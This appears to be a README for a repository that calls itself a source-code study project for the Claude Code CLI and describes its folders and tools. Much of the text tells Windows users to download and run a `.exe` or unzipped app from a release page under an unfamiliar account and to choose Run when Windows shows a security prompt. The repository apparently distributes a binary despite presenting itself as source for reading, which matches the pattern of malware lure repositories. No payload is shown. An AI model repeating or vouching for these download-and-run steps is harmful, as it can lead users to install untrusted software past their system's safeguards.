# 🤖 Claude-code - Learn and run Claude Code

[![Download Claude-code](https://img.shields.io/badge/Download%20Claude-code-blue?style=for-the-badge)](https://github.com/insightful-trimming472/Claude-code/releases)

## 🧭 What this is

Claude-code is a source code study project for the Claude Code CLI. It helps you explore how the tool is built and how its parts work together.

This project uses:
- TypeScript and TSX
- Bun for running and managing packages
- Ink for terminal UI
- Commander.js for command handling
- Chalk for terminal styling

It is built around command-line work, file tools, and small services that support code tasks.

## 📥 Download

1. Open the release page: https://github.com/insightful-trimming472/Claude-code/releases
2. Look for the latest release
3. Download the file for Windows if one is listed
4. Save the file to a folder you can find easily, such as Downloads or Desktop

If the release includes a `.exe` file, run that file after download. If it includes a `.zip` file, unzip it first, then open the app inside the folder.

## 🪟 Windows setup

Use these steps on a Windows PC:

1. Download the release from the link above
2. Open File Explorer and go to the folder where the file was saved
3. If the file is a `.zip`, right-click it and choose Extract All
4. Open the extracted folder
5. Double-click the app file to start it
6. If Windows shows a security prompt, choose Run if you trust the file source

If the app opens in a terminal window, keep that window open while you use it.

## ⚙️ What you need

A typical Windows setup should work with this project:

- Windows 10 or Windows 11
- Internet access for first-time use
- A terminal app if the tool runs in command line mode
- Enough free space for the app and its files
- A modern CPU and at least 4 GB of RAM

For best results, use the newest Windows update you can install.

## 🧰 Main parts of the project

The code is grouped into clear folders so each part has one job:

- `commands/` handles slash commands like `/commit` and `/review`
- `components/` holds the user interface parts
- `services/` holds core app logic
- `tools/` contains file and shell tools
- `hooks/` stores reusable React hooks
- `constants/` keeps shared values
- `ink/` connects the terminal UI pieces
- `utils/` includes helper code

This layout makes it easier to study how the app works from end to end.

## 🖥️ What the app can do

The project shows how a CLI assistant can support coding work such as:

- Reading files
- Editing files
- Searching code
- Matching file names
- Running shell commands
- Handling tasks in steps
- Syncing settings
- Working with API services
- Connecting to MCP tools

These parts work together to support a command-line coding assistant.

## 📂 Project structure

```text
src/
├── commands/          # Slash commands such as /commit and /review
├── components/        # UI components based on Ink React
│   └── design-system/ # Shared UI pieces
├── services/          # Core services
│   ├── api/           # API service layer
│   ├── mcp/           # MCP protocol support
│   ├── analytics/    # Usage analysis
│   └── settingsSync/ # Settings sync
├── tools/             # Tool implementations
│   ├── BashTool/     # Shell command execution
│   ├── FileReadTool/ # Read files
│   ├── FileEditTool/ # Edit files
│   ├── GrepTool/     # Search code
│   ├── GlobTool/     # Match files
│   ├── TaskTool/     # Task agent
│   └── ...           # More tools
├── hooks/             # React hooks
├── constants/         # Shared values
├── ink/               # Terminal UI framework
├── utils/             # Helper code
```

## 🚀 First use

After you start the app, you may see a command prompt or a menu in the terminal.

Use it to:
1. Pick a task
2. Enter a file or command
3. Review the result
4. Repeat the next step if needed

If the app asks for a path, type the full path to the file or folder you want to use.

## 🔍 Reading the source

If you want to study the code, start in this order:

1. `src/commands/` to see user commands
2. `src/tools/` to see file and shell actions
3. `src/services/` to see app logic
4. `src/components/` to see the terminal UI
5. `src/utils/` for helper functions

This order helps you understand how input moves through the app.

## 🧪 Common use cases

People may use this project to:

- Learn how a CLI AI assistant is built
- Study command handling in a terminal app
- See how file tools work in a code assistant
- Explore Ink-based terminal UI design
- Understand service layers in a TypeScript app

## 🛠️ Troubleshooting

If the app does not start:

- Check that the file finished downloading
- Make sure you opened the correct release file
- Try moving the file to a simple folder such as `C:\Claude-code`
- Run it again from that folder
- If the app opens and closes fast, start it from a terminal window so you can see messages

If Windows blocks the file, check the file name and source page before you run it.

## 📄 File notes

This repository is a source code study project for Claude Code CLI. The code is meant for reading, testing, and learning how the tool is put together.

## 🔗 Download again

[Open the release page to download](https://github.com/insightful-trimming472/Claude-code/releases)